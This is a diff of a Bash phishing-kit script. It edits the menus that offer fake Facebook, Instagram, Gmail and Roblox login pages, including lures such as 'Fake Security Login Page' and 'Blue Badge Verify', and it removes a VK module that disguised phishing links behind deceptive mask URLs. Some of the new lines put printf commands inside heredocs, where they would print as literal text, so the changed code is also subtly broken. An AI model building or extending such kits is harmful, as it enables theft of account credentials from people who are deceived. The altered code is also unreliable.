@@ -403,10 +403,7 @@ custom_url() {
 site_facebook() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
+		printf "${PURPLE}┃${RESET} ${GREEN}${BOLD}➤ [01]${RESET} ${WHITE}${BOLD}Página Tradicional De Login${RESET}\n"
 
 	EOF
 
@@ -439,10 +436,7 @@ site_facebook() {
 site_instagram() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
+		printf "${PURPLE}┃${RESET} ${GREEN}${BOLD}➤ [01]${RESET} ${WHITE}${BOLD}Página Tradicional De Login${RESET}\n"
 
 	EOF
 
@@ -475,9 +469,7 @@ site_instagram() {
 site_gmail() {
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
+		printf "${PURPLE}┃${RESET} ${GREEN}${BOLD}➤ [01]${RESET} ${WHITE}${BOLD}Página Tradicional De Login${RESET}\n"
 
 	EOF
 
@@ -502,32 +494,6 @@ site_gmail() {
 	esac
 }
 
-## Vk
-site_vk() {
-	cat <<- EOF
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-
-	EOF
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	case $REPLY in 
-		1 | 01)
-			website="vk"
-			mask='https://vk-premium-real-method-2020'
-			tunnel_menu;;
-		2 | 02)
-			website="vk_poll"
-			mask='https://vote-for-the-best-social-media'
-			tunnel_menu;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_vk; };;
-	esac
-}
-
 ## Menu
 ## Menu
 main_menu() {
@@ -539,10 +505,10 @@ main_menu() {
 	printf "${GREEN}${BOLD}:: SELECT TARGET MODULE ::${RESET}\n"
 	printf "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n\n"
 
-	printf "${CYAN}[01]${RESET} ${WHITE}Facebook${RESET}\n"
-	printf "${CYAN}[02]${RESET} ${WHITE}Instagram${RESET}\n"
-	printf "${CYAN}[03]${RESET} ${WHITE}Google${RESET}\n"
-	printf "${CYAN}[35]${RESET} ${WHITE}Roblox${RESET}\n\n"
+	printf "${CYAN}${BOLD}➤ [01] Facebook${RESET}\n"
+    printf "${CYAN}${BOLD}➤ [02] Instagram${RESET}\n"
+    printf "${CYAN}${BOLD}➤ [03] Google${RESET}\n"
+    printf "${CYAN}${BOLD}➤ [35] Roblox${RESET}\n"
 
 	printf "${GRAY}Press Ctrl + C to Exit${RESET}\n\n"
 
